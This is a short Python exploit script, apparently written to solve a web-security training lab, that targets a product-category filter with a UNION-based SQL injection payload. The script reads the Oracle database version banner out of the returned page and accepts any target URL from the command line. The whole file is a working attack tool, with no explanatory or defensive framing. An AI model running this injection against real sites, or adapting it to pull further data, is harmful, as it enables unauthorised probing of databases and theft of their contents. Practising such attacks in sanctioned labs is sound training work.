import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#setting up the http and https proxies
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

#exploit funtion
def exploit_db_version(url):
    path = "filter?category=Tech+gifts"
    sqli_payload = " ' UNION SELECT banner, NULL FROM v$version--"
    r = requests.get(url + path + sqli_payload, verify=False)
    res = r.text
    if 'Oracle Database' in res:
        print("[+]found the databse version")
        soup = BeautifulSoup(res, 'html.parser')
        version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
        print("[+]oracle db version is " + version)
        return True
    return False

#flow of the attack
if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except:
        print("[-]enter the proper command")
        print("[-]example: python3 sqli_oracle_version_exploit.py <url>")
        sys.exit(-1)
    
    print("[+]dumping the version of oracle Database")
    if not exploit_db_version(url):
        print("[-]unable to dump the db version")
